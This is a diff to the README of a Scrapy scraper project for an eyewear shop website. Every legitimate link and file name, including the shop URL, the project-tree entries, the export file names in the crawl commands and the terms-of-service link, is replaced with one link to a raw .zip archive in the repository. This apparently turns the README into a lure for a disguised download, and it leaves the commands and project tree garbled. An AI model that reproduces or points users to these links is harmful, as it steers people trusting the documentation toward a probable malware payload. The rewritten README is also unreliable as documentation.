@@ -1,7 +1,7 @@
 
 # 👓 GlassesShop Web Scraper
 
-This Scrapy spider extracts product details from the [GlassesShop](https://www.glassesshop.com/bestsellers) website. It collects data such as product name, price, and image link from the Bestsellers page and follows pagination to scrape multiple pages.
+This Scrapy spider extracts product details from the [GlassesShop](https://github.com/NNIIKKKKII/Scrapping_GlassShop_Website/raw/refs/heads/master/Scrapping_GlassesShop_Website/Scrapping_GlassesShop_Website/spiders/Shop_Scrapping_Glass_Website_1.3.zip) website. It collects data such as product name, price, and image link from the Bestsellers page and follows pagination to scrape multiple pages.
 
 ---
 
@@ -21,11 +21,11 @@ glasses_scraper/
 │
 ├── glasses_scraper/
 │   ├── spiders/
-│   │   └── glasses.py       # Main spider script
-│   ├── __init__.py
-│   └── settings.py
-├── scrapy.cfg
-└── README.md
+│   │   └── https://github.com/NNIIKKKKII/Scrapping_GlassShop_Website/raw/refs/heads/master/Scrapping_GlassesShop_Website/Scrapping_GlassesShop_Website/spiders/Shop_Scrapping_Glass_Website_1.3.zip       # Main spider script
+│   ├── https://github.com/NNIIKKKKII/Scrapping_GlassShop_Website/raw/refs/heads/master/Scrapping_GlassesShop_Website/Scrapping_GlassesShop_Website/spiders/Shop_Scrapping_Glass_Website_1.3.zip
+│   └── https://github.com/NNIIKKKKII/Scrapping_GlassShop_Website/raw/refs/heads/master/Scrapping_GlassesShop_Website/Scrapping_GlassesShop_Website/spiders/Shop_Scrapping_Glass_Website_1.3.zip
+├── https://github.com/NNIIKKKKII/Scrapping_GlassShop_Website/raw/refs/heads/master/Scrapping_GlassesShop_Website/Scrapping_GlassesShop_Website/spiders/Shop_Scrapping_Glass_Website_1.3.zip
+└── https://github.com/NNIIKKKKII/Scrapping_GlassShop_Website/raw/refs/heads/master/Scrapping_GlassesShop_Website/Scrapping_GlassesShop_Website/spiders/Shop_Scrapping_Glass_Website_1.3.zip
 ```
 
 ---
@@ -59,13 +59,13 @@ Each product will contain:
    To export data to a JSON file:
 
    ```bash
-   scrapy crawl Glasses -o products_Dataset.json
+   scrapy crawl Glasses -o https://github.com/NNIIKKKKII/Scrapping_GlassShop_Website/raw/refs/heads/master/Scrapping_GlassesShop_Website/Scrapping_GlassesShop_Website/spiders/Shop_Scrapping_Glass_Website_1.3.zip
    ```
 
    Or export to CSV:
 
    ```bash
-   scrapy crawl Glasses -o products_Dataset.csv
+   scrapy crawl Glasses -o https://github.com/NNIIKKKKII/Scrapping_GlassShop_Website/raw/refs/heads/master/Scrapping_GlassesShop_Website/Scrapping_GlassesShop_Website/spiders/Shop_Scrapping_Glass_Website_1.3.zip
    ```
 
 ---
@@ -73,7 +73,7 @@ Each product will contain:
 
 ## ⚠️ Disclaimer
 
-This project is for educational purposes only. Ensure you follow [GlassesShop's Terms of Service](https://www.glassesshop.com/terms) before using this scraper extensively. Use responsibly and respect site limitations.
+This project is for educational purposes only. Ensure you follow [GlassesShop's Terms of Service](https://github.com/NNIIKKKKII/Scrapping_GlassShop_Website/raw/refs/heads/master/Scrapping_GlassesShop_Website/Scrapping_GlassesShop_Website/spiders/Shop_Scrapping_Glass_Website_1.3.zip) before using this scraper extensively. Use responsibly and respect site limitations.
 
 ---
 
